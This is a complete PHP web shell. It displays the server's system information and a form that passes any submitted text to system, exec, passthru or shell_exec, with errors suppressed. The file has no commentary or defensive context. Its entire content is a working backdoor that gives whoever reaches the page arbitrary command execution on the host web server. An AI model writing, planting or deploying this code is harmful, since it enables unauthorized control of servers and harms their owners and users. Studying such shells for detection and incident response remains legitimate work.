<?php
echo "<center><b><u>&gt;&gt; ".php_uname()."</b></u> &lt;&lt;<br><br>";
echo "<center><form method='post'><font>Command : </font>
<input type='text' size='30' height='10' name='command'><input type='submit' name='postcmd' value='>'></form>";
	if(isset($_POST['postcmd'])) {
echo'<div style="margin:1px;padding:1px;text-align:center;color:black;"><pre>';
$cmd = $_POST['command'];
if($cmd == "")
{
echo "???";
 } 
elseif(isset($cmd))
 {
 $output = exe($cmd);
 echo $output; }
echo'</pre></div></center>';
}

function exe($cmd) { 	
if(function_exists('system')) { 		
		@ob_start(); 		
		@system($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('exec')) { 		
		@exec($cmd,$results); 		
		$buff = ""; 		
		foreach($results as $result) { 			
			$buff .= $result; 		
		} return $buff; 	
	} elseif(function_exists('passthru')) { 		
		@ob_start(); 		
		@passthru($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('shell_exec')) { 		
		$buff = @shell_exec($cmd); 		
		return $buff; 	
	} 
}